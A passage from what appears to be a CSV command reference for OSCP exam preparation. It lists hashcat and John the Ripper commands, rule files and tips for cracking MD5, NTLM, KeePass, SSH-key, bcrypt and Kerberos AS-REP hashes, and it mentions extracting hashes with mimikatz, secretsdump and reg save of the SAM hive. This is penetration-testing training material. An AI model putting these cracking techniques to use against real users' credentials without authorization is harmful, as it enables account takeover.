! @ # $ % (most to least common).","high","","","","","{""c"": ""Capitalize first letter - Lowercase first letter becomes uppercase. password \u2192 Password. Extremely common - many policies require uppercase letter. Users typically capitalize ONLY first letter (path of least resistance)."", ""$!"": ""Append exclamation mark - Special character requirement often satisfied by appending ! to existing password. Combines with c to create: password \u2192 Password! (satisfies: uppercase + special char requirements).""}","","[""rule-append-digit"", ""create-policy-rules""]","[""hashcat-test-rules"", ""john-test-rules""]"
"rule-leet-speak","Leet Speak (1337) Substitution Rule","enumeration","echo -e 'sa@\nse3\nsi1\nso0\nss$' > <RULE_FILE>","Create rule to substitute common leet speak characters","","echo -e 'sa@\nse3\nsi1\nso0\nss$' > leet.rule","OSCP TIP:
Leet speak remains surprisingly common.

'password' with leet rules  p@ssw0rd, p@ssword, passw0rd, etc.

Users think it increases security (it doesn't significantly - just increases keyspace slightly).

Full leet transform:
password  p@55w0rd.

Test incrementally:
single substitutions first (faster), then combinations.

Hashcat has built-in toggles for common substitutions.

John rule syntax identical to Hashcat for basic s/^/$ operators.","medium","","","","","{""s"": ""Substitute character - Format: sXY (replace all X with Y). sa@ = replace 'a' with '@', se3 = replace 'e' with '3', si1 = replace 'i' with '1', so0 = replace 'o' with '0', ss$ = replace 's' with '$'. Common leet speak: a\u2192@/4, e\u21923, i\u21921/!, o\u21920, s\u2192$/5, t\u21927, l\u21921. Multiple rules in same file = John/Hashcat try each separately."", ""echo -e"": ""Enable escape sequences - The -e flag allows \\n (newline) to create multiple rules in one command. Each line = separate rule. Alternative: Create file manually with text editor, one rule per line.""}","","",""
"rule-duplicate-word","Duplicate Word Rule","enumeration","echo 'd' > <RULE_FILE>","Create rule to duplicate entire word","","echo 'd' > duplicate.rule","OSCP TIP:
Duplication common when minimum length > typical word length.

Corporate policies often require 12-16 chars - users duplicate short passwords.

Combine with other rules:
d $! (duplicate + append !)  password  passwordpassword!.

Also test:
d $1 $2 $3 (duplicate + append digits).

Similar patterns:
word + reversed word (password + drowssap = rule:
d r).","medium","","","","","{""d"": ""Duplicate word - Appends entire word to itself. password \u2192 passwordpassword. Surprisingly common for length requirements. Users need 16+ char password, pick 8-char word, double it. Satisfies length without memorizing complex string. Also common: password123password123, welcome1welcome1.""}","","",""
"hashcat-test-rules","Test Hashcat Rules with Stdout","enumeration","hashcat <WORDLIST> -r <RULE_FILE> --stdout | head -20","Preview rule mutations without cracking","","hashcat passwords.txt -r custom.rule --stdout | head -20","OSCP TIP:
ALWAYS test rules before cracking.

Bad rule syntax = wasted time (hours/days of cracking with 0 results).

Testing workflow:
1) Create small test wordlist (10 words), 2) Run with --stdout, 3) Verify mutations match intent, 4) Run full crack.

Example:
echo 'password' | hashcat -r best64.rule --stdout (shows all 64 mutations of 'password').

Count mutations:
hashcat wordlist.txt -r rule.rule --stdout | wc -l","high","","","","","{""-r"": ""Rule file - Apply mutations from rule file to wordlist. Each rule in file processed separately. Multiple -r flags chain rules (apply sequentially)."", ""--stdout"": ""Standard output mode - Print mutated passwords to terminal instead of cracking. CRITICAL for testing - verify rules work as expected BEFORE running hours-long crack session. Shows exactly what passwords will be tested."", ""| head -20"": ""Limit output to first 20 lines - Rules can generate millions of mutations. Preview prevents terminal flood. Remove for full output or redirect: --stdout > mutated.txt""}","[""create-policy-rules""]","[""john-test-rules""]","[""hashcat-rule-attack"", ""hashcat-crack""]"
"john-test-rules","Test John Rules with Stdout","enumeration","john --wordlist=<WORDLIST> --rules=<RULESET> --stdout | head -20","Preview John the Ripper rule mutations","","john --wordlist=passwords.txt --rules=KoreLogic --stdout | head -20","OSCP TIP:
John rules more complex than Hashcat (support conditionals, variables, multiple operations per line).

Test before using.

Common rulesets:
Wordlist (1600+ rules - aggressive), Single (smaller, username-based), KoreLogic (popular, balanced).

Show available rules:
john --list=rules.

Example:
echo 'password' | john --stdin --rules=Wordlist --stdout | head -100 (first 100 mutations).

Rule syntax differences:
John uses [] for character classes, Hashcat uses literal notation.","high","","","","","{""--rules"": ""Rule set - Apply named rule set from john.conf OR custom rule file. Named sets: Wordlist, Single, KoreLogic, Jumbo. Custom: --rules=./custom.rule (loads external file). No argument = default Wordlist rules."", ""--stdout"": ""Standard output mode - Print mutated passwords to terminal without cracking. Same purpose as Hashcat --stdout. Essential for rule verification before committing to long crack session.""}","[""rule-append-digit"", ""rule-prepend-year"", ""rule-capitalize-append"", ""create-policy-rules""]","[""hashcat-test-rules""]","[""john-rules-attack"", ""john-custom-rules-conf""]"
"hashcat-best64-rules","Hashcat Best64 Rules","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force","Apply proven 64-rule set optimized for common password patterns","","hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","OSCP TIP:
Rule priority for time-constrained scenarios (exams):
1) Straight wordlist (no rules), 2) best64.rule (fast, proven), 3) rockyou-30000.rule (aggressive but slower), 4) dive.rule (most comprehensive).

Best64 with rockyou.txt:
14M words * 64 rules = 896M candidates (few minutes on GPU).

Success rate:
30-50% on weak passwords.

Faster than brute-force, smarter than straight wordlist.

Alternative:
John's Wordlist ruleset (1600+ rules, more aggressive) - john --wordlist=<WORDLIST> --rules=Wordlist <HASH_FILE>","high","","","","","{""-r /usr/share/hashcat/rules/best64.rule"": ""Best64 ruleset - 64 PROVEN rules covering most common password mutations. Includes: capitalize, append digits, append special chars, leet speak, combinations. Developed from real-world password analysis. EXCELLENT first rule attack - fast (only 64 rules) + high success rate. Alternative location: /opt/hashcat/rules/best64.rule""}","","[""hashcat-rockyou-rules"", ""john-rules-attack""]","[""hashcat-show-cracked""]"
"hashcat-rockyou-rules","Hashcat RockYou-30000 Rules","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -r /usr/share/hashcat/rules/rockyou-30000.rule --force","Apply comprehensive 30,000-rule set for aggressive mutation","","hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force","OSCP TIP:
Use when:
1) Fast rules (best64) failed, 2) Hash type is fast (MD5, NTLM - millions of H/s), 3) You have time (not during exam pressure).

AVOID for slow hashes (bcrypt, KeePass - hundreds of H/s) unless desperate.

Time estimate:
NTLM on GPU = few hours, bcrypt = weeks.

Alternative approach:
Use smaller custom ruleset targeting observed password policy (if known).","medium","","","","","{""-r /usr/share/hashcat/rules/rockyou-30000.rule"": ""RockYou-30000 ruleset - 30,000 rules generated from analysis of RockYou breach (32M real passwords). HIGHLY effective but SLOW. Covers: complex substitutions, multi-character appends, case variations, insertions. Use when best64 fails and you have time. Generates: rockyou.txt (14M) * 30,000 rules = 420 BILLION candidates (hours/days depending on hash type).""}","[""hashcat-best64-rules""]","[""john-rules-attack""]","[""hashcat-show-cracked""]"
"hashcat-dive-rules","Hashcat Dive Rules","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -r /usr/share/hashcat/rules/dive.rule --force","Apply dive.rule (comprehensive ruleset for thorough cracking)","","hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule --force","OSCP TIP:
Dive.rule is overkill for 99% of OSCP scenarios.

Time investment rarely justified in 24-hour exam.

Better strategy:
Focus on intelligence gathering (find password policy, leaked credentials, default passwords).

Use dive.rule for offline practice when learning password behavior.

Practical usage:
Small custom wordlist (10-100 words) + dive.rule = manageable.

rockyou.txt + dive.rule = exam time wasted.","low","","","","","{""-r /usr/share/hashcat/rules/dive.rule"": ""Dive ruleset - Most comprehensive built-in ruleset (100,000+ rules). Covers virtually every common mutation pattern. EXTREMELY slow (generates trillions of candidates). Use as LAST resort when all other attacks fail. Typically used with SMALL targeted wordlists (company name, usernames, known phrases) - NOT rockyou.txt.""}","","",""
"john-custom-rules-conf","Add Custom Rules to john.conf","enumeration","echo -e '[List.Rules:Custom]\nc $1\nc $2\nc $3' >> ~/.john/john.conf","Create custom rule set in John configuration","","","OSCP TIP:
Custom rules allow targeted attacks based on discovered password policy.

Example:
Policy requires uppercase, digit, special char  Create rules:
c $1 $!, c $2 $@, c $3 $#.

Rule syntax same as Hashcat for basic operations (s, ^, $, c, d, r, t).

John also supports advanced features:
conditionals (>[1-9] = reject if length < N), character position operations, context-sensitive mutations.

View all built-in rules:
john --list=rules (shows Wordlist, Single, etc.).","medium","","","","","{""[List.Rules:Custom]"": ""Rule section header - Defines new rule set named 'Custom'. Use with: john --rules=Custom. Can create multiple sections with different names: [List.Rules:YearAppend], [List.Rules:CompanyPolicy], etc. Stored in ~/.john/john.conf (user-specific) or /etc/john/john.conf (system-wide)."", ""echo -e '...' >> ~/.john/john.conf"": ""Append to config - The >> operator APPENDS to file (doesn't overwrite). -e enables escape sequences (\\n = newline). Alternative: Edit ~/.john/john.conf directly with text editor. Format: [Section header] followed by rules (one per line).""}","","",""
"create-policy-rules","Generate Rules from Password Policy","enumeration","echo -e 'c $<YEAR> $!\nc $<YEAR> $@\nc $<YEAR> $#' > <RULE_FILE>","Create rules matching discovered password policy requirements","","echo -e 'c $2024 $!\nc $2024 $@\nc $2024 $#' > policy.rule","OSCP TIP:
Intelligence-driven rule creation.

Scenario:
Discovered policy via error message ('Password must contain:
1 uppercase, 1 digit, 1 special char, min 12 characters').

Create targeted rules:
c $2 $0 $2 $4 $! (Capitalize + 2024 + ! = 'Password2024!', 12 chars).

Also test:
Season + Year patterns (Spring2024!, Summer2024!).

Combine with company-specific wordlist (company name, products, locations).

100-word targeted list + smart rules > 14M-word generic list.","high","","","","","{""c $<YEAR> $!"": ""Multi-mutation rule - Combines 3 operations: 1) c (capitalize first letter), 2) $<YEAR> (append year digits - $2 $0 $2 $4), 3) $! (append exclamation). Transforms: password \u2192 Password2024!. Satisfies common policy: uppercase + digit + special char. Pattern extremely common in corporate environments."", ""Multiple variations"": ""Same base rule with different special chars (!@#) - Users pick one special char, typically from keyboard top row. Testing all three covers 90% of special char choices. Order by frequency: ! (most common), @ (second), # (third).""}","[""net-accounts-domain""]","[""rule-append-digit"", ""rule-capitalize-append"", ""rule-prepend-year""]","[""hashcat-rule-attack"", ""john-crack""]"
"hashcat-benchmark","Hashcat Benchmark Hash Rates","enumeration","hashcat -b","Benchmark all hash algorithms to determine cracking speed","","","OSCP TIP:
Run benchmark BEFORE exam to understand your hardware capabilities.

Calculate cracking time = keyspace / hash_rate.

Example:
MD5 @ 68,000 MH/s vs SHA256 @ 9,000 MH/s.

GPU benchmark requires GPU passthrough in VM or physical machine.

VM without GPU will use CPU (much slower).","medium","","","","{""No devices found"": ""No GPU detected or drivers missing. Install: apt install ocl-icd-opencl-dev nvidia-opencl-icd (NVIDIA) or amdgpu-pro (AMD)"", ""OpenCL initialization failed"": ""OpenCL runtime not installed. Solution: apt install ocl-icd-libopencl1"", ""Running on CPU"": ""Expected in Kali VM without GPU passthrough. Use --force flag to suppress warnings""}","{""-b"": ""Benchmark mode - Tests all supported hash algorithms and displays hash rate (hashes per second). Critical for: 1) Calculating cracking time before starting 2) Comparing GPU vs CPU performance 3) Determining hardware bottlenecks. Results in MH/s (millions of hashes/second). GPU typically 10-100x faster than CPU for most algorithms.""}","","","[""hashcat-md5-crack"", ""hashcat-ntlm-crack"", ""hashcat-sha256-crack""]"
"hashcat-md5-crack","Crack MD5 Hash (Mode 0)","enumeration","hashcat -m 0 <HASH_FILE> <WORDLIST> --force","Crack MD5 hashes using dictionary attack","","hashcat -m 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt --force","OSCP TIP:
MD5 is FAST (68,000 MH/s on GPU = 68 billion hashes/second).

8-char password with full charset = 6.5 hours.

Always try straight dictionary attack before rules.

Remove 'username:' prefix from hash file unless using --username flag.

Verify mode matches hash type.","high","","","","{""No hashes loaded"": ""Hash format incorrect. Solution: Ensure one hash per line, no extra spaces. Remove usernames if present (user:hash \u2192 hash only unless hash:pass format expected)"", ""Token length exception"": ""Hash format doesn't match mode. Solution: Verify hash type with hash-identifier or hashid"", ""Separator unmatched"": ""Hash file has incorrect format. For username:hash format, use --username flag""}","{""-m 0"": ""Hash mode 0 - MD5 algorithm. Use 'hashcat --help' or hashcat wiki to find modes. Common: 0=MD5, 100=SHA1, 1400=SHA256, 1000=NTLM, 3200=bcrypt, 1800=sha512crypt. Mode MUST match hash type or cracking fails silently."", ""--force"": ""Force execution - Ignore warnings about drivers/OpenCL. REQUIRED in Kali VM without GPU. WARNING: May produce incorrect results in edge cases - verify found passwords manually when using --force. Only use when necessary (VM testing, driver issues).""}","","[""john-wordlist-attack""]","[""hashcat-show-cracked"", ""hashcat-rule-attack"", ""ssh-login-password""]"
"hashcat-sha256-crack","Crack SHA256 Hash (Mode 1400)","enumeration","hashcat -m 1400 <HASH_FILE> <WORDLIST> --force","Crack SHA-256 hashes using dictionary attack","","hashcat -m 1400 sha256_hashes.txt /usr/share/wordlists/rockyou.txt --force","SHA-256 hash length:
64 characters.

Example:
5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6 = 'secret1'.

Slower than MD5 but still GPU-friendly.","high","","","","","{""-m 1400"": ""Hash mode 1400 - SHA-256 algorithm. Slower than MD5 but still fast (9,000 MH/s on GPU vs 68,000 for MD5). Common in modern applications. SHA-256 hash = 64 hex characters.""}","","[""john-wordlist-attack""]","[""hashcat-show-cracked"", ""hashcat-rule-attack""]"
"hashcat-ntlm-crack","Crack NTLM Hash (Mode 1000)","enumeration","hashcat -m 1000 <HASH_FILE> <WORDLIST> --force","Crack Windows NTLM hashes","","hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force","OSCP TIP:
NTLM hashes from Windows SAM, memory dumps, or SMBv1/v2 captures.

EXTREMELY fast cracking (no salt).

Common in Windows domain environments.

Extract with:
mimikatz, secretsdump.py, reg save HKLM\SAM sam.save","high","","","","","{""-m 1000"": ""Hash mode 1000 - NTLM (Windows password hashes). VERY FAST to crack (even faster than MD5). Extracted from SAM database, memory (mimikatz), or SMB authentication. Format: 32 hex characters. No salt = rainbow table vulnerable.""}","[""secretsdump-hashes"", ""ad-sam-dump-reg-save""]","[""john-wordlist-attack""]","[""hashcat-show-cracked"", ""pth-evil-winrm"", ""crackmapexec-validate-admin""]"
"hashcat-rule-attack","Hashcat Rule-Based Attack","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -r <RULE_FILE> --force","Apply mutation rules to wordlist passwords","","hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","OSCP TIP:
Rule-based attacks crack passwords that don't exist in wordlist.

Password policies require complexity = users modify base words (Password  Password123!).

Best rules for OSCP:
best64.rule (fast testing), rockyou-30000.rule (designed for rockyou.txt).

Dramatically increases keyspace (14M passwords  30,000 rules = 420B attempts).

Monitor with --status to track progress.","high","","","","","{""-r"": ""Rule file - Apply mutation rules to wordlist. Rules modify passwords (append, prepend, capitalize, etc.). Hashcat includes proven rules in /usr/share/hashcat/rules/. Best rules: best64.rule (fast), rockyou-30000.rule (thorough), dive.rule (comprehensive). Custom rules format: one rule per line, uses hashcat rule syntax ($1 = append '1', c = capitalize, etc.)""}","[""hashcat-test-rules""]","[""john-rules-attack"", ""hashcat-best64-rules""]","[""hashcat-show-cracked""]"
"hashcat-keepass-crack","Crack KeePass Database (Mode 13400)","enumeration","hashcat -m 13400 <KEEPASS_HASH> <WORDLIST> -r <RULE_FILE> --force","Crack KeePass master password","","hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force","OSCP TIP:
KeePass databases found in user Documents, Desktop, or network shares.

Extract hash with keepass2john Database.kdbx > keepass.hash.

Remove 'Database:' prefix.

KeePass uses strong KDF (slow hashing) - cracking takes longer than simple hashes.

Focus on targeted wordlists based on user password patterns.

Common user behavior:
reuse password fragments with policy modifications (Password1!  Password123!).","high","","","","{""Token length exception"": ""Hash format invalid. Solution: Ensure keepass2john output is correct format, remove 'filename:' prefix before first $keepass$""}","{""-m 13400"": ""Hash mode 13400 - KeePass 1 (AES/Twofish) and KeePass 2 (AES). Password manager master password. SLOW algorithm (by design - bcrypt-based KDF with iterations). CPU cracking may be comparable to GPU for KeePass. Hash extracted with keepass2john tool.""}","[""keepass2john-extract""]","[""john-keepass-crack""]","[""hashcat-show-cracked"", ""ssh-login-password"", ""evil-winrm-shell""]"
"hashcat-ssh-key-crack","Crack SSH Private Key Passphrase (Mode 22921)","enumeration","hashcat -m 22921 <SSH_HASH> <WORDLIST> -r <RULE_FILE> --force","Crack SSH private key passphrase (aes-256-cbc cipher)","","hashcat -m 22921 ssh.hash custom_wordlist.txt -r custom.rule --force","OSCP TIP:
SSH private keys found in ~/.ssh/id_rsa, web server file disclosure vulnerabilities, or backup files.

Extract hash with ssh2john id_rsa > ssh.hash.

Remove 'id_rsa:' prefix.

Check hash for cipher type:
$6$ = aes-256-cbc (Hashcat OK), others may require JtR.

Modern keys often use aes-256-ctr (JtR required).

Build custom wordlists from user information (names, dates, common words found in notes.txt).","medium","","","","{""Token length exception"": ""SSH key uses unsupported cipher (likely aes-256-ctr). Solution: Use John the Ripper instead - it supports more SSH ciphers including aes-256-ctr"", ""No hashes loaded"": ""Hash format incorrect. Ensure ssh2john output format, remove 'filename:' prefix""}","{""-m 22921"": ""Hash mode 22921 - SSH private keys (RSA/DSA/EC) encrypted with aes-256-cbc cipher ($6$ in hash). WARNING: Modern SSH keys may use aes-256-ctr cipher which Hashcat does NOT support. If you get 'Token length exception', use John the Ripper instead (john supports aes-256-ctr).""}","[""ssh2john-extract""]","[""john-ssh-key-crack""]","[""hashcat-show-cracked"", ""ssh-connect-password""]"
"hashcat-combination-attack","Hashcat Combination Attack","enumeration","hashcat -m <MODE> -a 1 <HASH_FILE> <WORDLIST1> <WORDLIST2> --force","Combine words from two wordlists (word1+word2)","","hashcat -m 0 -a 1 hashes.txt words1.txt words2.txt --force","Combination attack for compound passwords.

Example:
First names + Last names, Words + Years, Common prefixes + Common words.

Keyspace explodes quickly (1000  1000 = 1M passwords).

Consider using small focused lists.","medium","","","","","{""-a 1"": ""Attack mode 1 - Combination attack. Concatenates each word from wordlist1 with each word from wordlist2. Example: wordlist1=['pass','admin'] + wordlist2=['word','123'] = passwords: password, pass123, adminword, admin123. Keyspace = wordlist1_size \u00d7 wordlist2_size. Useful for passwords like firstname+lastname, word+year, prefix+suffix.""}","","",""
"hashcat-mask-attack","Hashcat Mask Attack (Brute-Force Pattern)","enumeration","hashcat -m <MODE> -a 3 <HASH_FILE> <MASK> --force","Brute-force attack using character mask pattern","","hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?d?s --force","Use mask attacks when password policy is known.

Example:
'Must start with capital, end with number and special char, 8 chars min'  ?u?l?l?l?l?d?d?s.

WARNING:
Brute-force is SLOW.

8-char full charset (?a?a?a?a?a?a?a?a) = years on CPU.

Only use for short passwords or constrained charsets.","low","","","","","{""-a 3"": ""Attack mode 3 - Mask attack (pure brute-force with pattern). Define character positions: ?l=lowercase, ?u=uppercase, ?d=digit, ?s=special. Example: ?u?l?l?l?l?d?d?d?s = Uppercase + 4 lowercase + 3 digits + 1 special (Password123!). Faster than full brute-force by constraining character sets per position. Use when password policy is known."", ""<MASK>"": ""Character mask - ?l=lowercase (a-z), ?u=uppercase (A-Z), ?d=digits (0-9), ?s=special (!@#$%...), ?a=all. Example masks: ?d?d?d?d?d?d (6 digits), ?u?l?l?l?l?d?d?s (Pass12!), ?a?a?a?a?a?a?a?a (8-char full brute). Keyspace = charset_size^positions.""}","","[""hashcat-increment"", ""john-incremental-mode""]","[""hashcat-show-cracked""]"
"hashcat-hybrid-attack","Hashcat Hybrid Attack (Wordlist + Mask)","enumeration","hashcat -m <MODE> -a 6 <HASH_FILE> <WORDLIST> <MASK> --force","Append mask pattern to wordlist words","","hashcat -m 0 -a 6 hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?s --force","Hybrid attacks for common password patterns:
base_word + digits + special.

Example:
rockyou.txt + ?d?d?s (2 digits + 1 special) = Password12!, Welcome99#, etc.

More efficient than full rule-based attack for this specific pattern.","medium","","","","","{""-a 6"": ""Attack mode 6 - Hybrid wordlist + mask. Appends mask to each wordlist word. Example: wordlist='password' + mask='?d?d?s' = password00!, password01!, password00@, etc. Mode 7 prepends mask instead. Efficient for 'base word + numbers + special' pattern (common user behavior).""}","","[""hashcat-rule-attack"", ""hashcat-mask-attack""]","[""hashcat-show-cracked""]"
"hashcat-show-cracked","Show Cracked Passwords","enumeration","hashcat -m <MODE> <HASH_FILE> --show","Display previously cracked passwords from potfile","","hashcat -m 0 hashes.txt --show","OSCP TIP:
Hashcat saves ALL cracked passwords to ~/.hashcat/hashcat.potfile permanently.

Use --show to retrieve results.

Critical for documentation - always run --show after successful crack to capture passwords for report.

Potfile persists across sessions.","high","","","","","{""--show"": ""Show cracked - Display passwords from hashcat.potfile (persistent storage). Hashcat automatically saves cracked hashes to ~/.hashcat/hashcat.potfile. Use --show to view results without re-running attack. Format: hash:password or username:hash:password.""}","[""hashcat-md5-crack"", ""hashcat-ntlm-crack""]","[""john-show-cracked""]","[""crackmapexec-validate-admin"", ""evil-winrm-shell"", ""ssh-login-password""]"
"hashcat-output-format","Hashcat Output Format Control","enumeration","hashcat -m <MODE> <HASH_FILE> --show --outfile-format=2","Control output format for cracked passwords","","hashcat -m 0 hashes.txt --show --outfile-format=2","Output formats:
2=password only (scripting), 5=hash:password (documentation).

Default format 5 is best for OSCP reporting.","medium","","","","","{""--outfile-format"": ""Output format - Controls --show output. Values: 1=hash, 2=plain, 3=hex_plain, 5=hash:plain (default). Use format 2 for password-only output (useful for scripting). Format 5 shows hash:password pairs (best for documentation).""}","","",""
"hashcat-status-timer","Hashcat Auto-Status Updates","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> --status --status-timer=10","Display progress status every N seconds","","hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --status --status-timer=10","OSCP TIP:
Use --status --status-timer=30 for long attacks (rule-based, large wordlists).

Provides ETA for completion.

Critical for time management in exam - know when to abandon attack if ETA exceeds available time.","medium","","","","","{""--status"": ""Status display - Show progress updates. Press 's' key manually for on-demand status. Displays: Progress %, Speed (H/s), Time (running/estimated), Recovered hashes, Rejected, Temperature, etc."", ""--status-timer"": ""Auto-status interval - Seconds between automatic status displays. Default: manual only. Use 10-60 for long-running attacks to monitor progress. Lower values = more output spam.""}","","",""
"hashcat-increment","Hashcat Increment Mode (Progressive Length)","enumeration","hashcat -m <MODE> -a 3 <HASH_FILE> ?a?a?a?a?a?a --increment --increment-min=<MIN> --increment-max=<MAX> --force","Brute-force with incrementing password length","","hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a --increment --increment-min=4 --increment-max=8 --force","Increment mode for brute-force when password length is unknown but constrained (policy:
4-12 chars).

WARNING:
Still extremely slow.

8-char full charset = years.

Only viable for fast hashes (MD5, NTLM) and short passwords (6 chars).","low","","","","","{""--increment"": ""Increment mode - Start with --increment-min length, progressively increase to --increment-max. Example: min=4, max=8 \u2192 tries all 4-char, then all 5-char, then 6, 7, 8. More efficient than starting at max length. Short passwords crack first."", ""--increment-min"": ""Minimum length - Starting password length for increment mode. Use known password policy minimum. Default: 1 (usually wasteful)."", ""--increment-max"": ""Maximum length - Maximum password length for increment mode. Constrained by mask length. Example: mask=?a?a?a?a?a?a?a?a (8 chars) with --increment-max=8 tries lengths 1-8.""}","","[""hashcat-mask-attack"", ""john-incremental-mode""]","[""hashcat-show-cracked""]"
"hashcat-potfile-disable","Hashcat Disable Potfile","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> --potfile-disable --force","Disable automatic saving of cracked hashes","","hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --potfile-disable --force","Rarely needed - potfile is BENEFICIAL for OSCP (persistent results, no re-cracking same hashes).

Only disable for testing or privacy.

Always use --outfile if potfile disabled.","low","","","","","{""--potfile-disable"": ""Disable potfile - Don't save cracked hashes to hashcat.potfile. Use when: 1) Testing/debugging 2) Don't want persistent storage 3) Privacy concerns. WARNING: Results lost after session unless manually saved with --outfile.""}","","",""
"hashcat-username-format","Hashcat Username:Hash Format","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> --username --force","Handle hash files with username:hash format","","hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --username --force","OSCP TIP:
secretsdump.py, mimikatz, and SAM dumps often output username:hash format.

Use --username flag to preserve username-password mapping for documentation.

Output format:
user:hash:password (critical for privilege escalation reporting).","medium","","","","{""Separator unmatched"": ""Hash file contains colons (username:hash format). Solution: Add --username flag or remove usernames (extract hash-only column)""}","{""--username"": ""Username parsing - Enable if hash file format is 'username:hash' (one per line). Hashcat extracts username for output. Results show: 'username:hash:password'. Common for NTLM dumps (user:hash from SAM or secretsdump.py output). Without flag, Hashcat treats entire line as hash (fails).""}","","",""
"hashcat-custom-charset","Hashcat Custom Character Set","enumeration","hashcat -m <MODE> -a 3 <HASH_FILE> -1 <CHARSET> <MASK> --force","Define custom character set for mask attack","","hashcat -m 0 -a 3 hashes.txt -1 abc123!@# ?1?1?1?1?1?1 --force","Custom charsets for constrained brute-force.

Example:
Hex passwords  -1 '0123456789abcdef' ?1?1?1?1?1?1.

Reduces keyspace dramatically (16^6 vs 95^6 for 6-char).","low","","","","","{""-1"": ""Custom charset 1 - Define custom character set. Use ?1 in mask to reference it. Up to -4 custom charsets (-1, -2, -3, -4). Example: -1 'aeiou' ?1?1?1?1 = 4-char passwords using only vowels. Useful for: Limited charset passwords, hex-only, specific symbols, etc."", ""?1"": ""Reference to custom charset 1 (defined with -1 flag). ?2 = charset 2 (-2), ?3 = charset 3 (-3), ?4 = charset 4 (-4).""}","","[""hashcat-mask-attack""]","[""hashcat-show-cracked""]"
"hashcat-bcrypt-crack","Crack bcrypt Hash (Mode 3200)","enumeration","hashcat -m 3200 <HASH_FILE> <WORDLIST> --force","Crack bcrypt hashes (SLOW algorithm)","","hashcat -m 3200 bcrypt_hashes.txt /usr/share/wordlists/rockyou.txt --force","OSCP WARNING:
bcrypt cracking is VERY SLOW (1000-10000 passwords/second vs billions for MD5).

14M rockyou.txt = 23-233 hours for straight dictionary.

NOT viable for exam time constraints unless:
1) Small focused wordlist 2) Password reuse suspected 3) No other attack vectors.

Focus on other vulnerabilities first.","medium","","","","{""Extremely slow progress"": ""Expected behavior - bcrypt is slow by design. Solution: 1) Use small focused wordlist 2) Rule-based attack with best rules only 3) Consider if viable given time constraints""}","{""-m 3200"": ""Hash mode 3200 - bcrypt algorithm. INTENTIONALLY SLOW (designed to resist cracking). Hash rate: ~100-10,000 H/s (compared to MD5: 68,000,000,000 H/s). GPU advantage minimal for bcrypt - CPU may be comparable. Common in modern web apps (Linux /etc/shadow $2y$, password managers). Requires FOCUSED wordlists (rockyou.txt = months/years).""}","","[""john-wordlist-attack""]","[""hashcat-show-cracked"", ""ssh-login-password""]"
"hashcat-debug-mode","Hashcat Debug Mode (Test Rules)","enumeration","hashcat <WORDLIST> -r <RULE_FILE> --stdout","Test rule mutations without cracking (debug mode)","","hashcat test_words.txt -r custom.rule --stdout","OSCP TIP:
Always test custom rules with --stdout before running full crack.

Verify mutations match expected password policy.

Example:
echo 'password' | hashcat -r rules --stdout (test single word).

Saves time vs discovering rule errors mid-crack.","medium","","","","","{""--stdout"": ""Debug mode - Output mutated passwords to stdout instead of cracking. No hash mode (-m) required. Used for: 1) Testing custom rules before cracking 2) Generating mutated wordlists 3) Verifying rule syntax. Can pipe output to file: hashcat wordlist -r rules --stdout > mutated.txt""}","","",""
"hashcat-optimized-kernel","Hashcat Optimized Kernel","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -O --force","Use optimized kernel for speed boost (password length 31)","","hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -O --force","Speed boost (~2x) but limits password length to 31 chars.

Safe for most real-world passwords (policies rarely allow >31).

Check password policy before using.","medium","","","","","{""-O"": ""Optimized kernel - Enable performance-optimized kernels for faster cracking. LIMITATION: Password length restricted to \u226431 characters (vs \u2264256 without -O). Speed increase: ~2x for many algorithms. Use when: 1) Password policy has length limit \u226431 2) No evidence of long passwords. WARNING: Will NOT crack passwords >31 chars.""}","","",""
"hashcat-crack-asrep","Crack Kerberos AS-REP Hash (Mode 18200)","enumeration","hashcat -m 18200 <HASH_FILE> <WORDLIST> -r <RULE_FILE> --force","Crack Kerberos AS-REP hashes (AS-REP Roasting attack)","","hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","AS-REP ROASTING HASH CRACKING for users with Kerberos preauthentication disabled.

HASH SOURCE:
impacket-GetNPUsers (Linux) or Rubeus asreproast (Windows).

HASH FORMAT CRITICAL:
Must be SINGLE LINE.

Rubeus without /nowrap flag produces MULTI-LINE hashes that Hashcat rejects.

Always use /nowrap.

HASH MODE IDENTIFICATION:
hashcat --help | grep -i 'Kerberos' | grep 'AS-REP' shows mode 18200.

CRACKING SPEED:
RC4-HMAC (etype 23) is FAST.

GPU:
~500 MH/s (rockyou.txt straight = <1 second).

CPU (Kali VM):
~500 KH/s (rockyou.txt straight = ~30 seconds).

RULE-BASED ATTACK:
hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force adds 77 mutations per password (Password  Password1, Password!, Password123, etc.).

TIME ESTIMATE:
Straight dictionary (14M passwords) = <1 min on CPU, <1 sec on GPU.

Rule-based (14M  77 = 1B+ combinations) = 5-30 min on CPU, 1-5 min on GPU.

OSCP TIP:
Try straight dictionary FIRST (fastest).

If fails, add best64.rule.

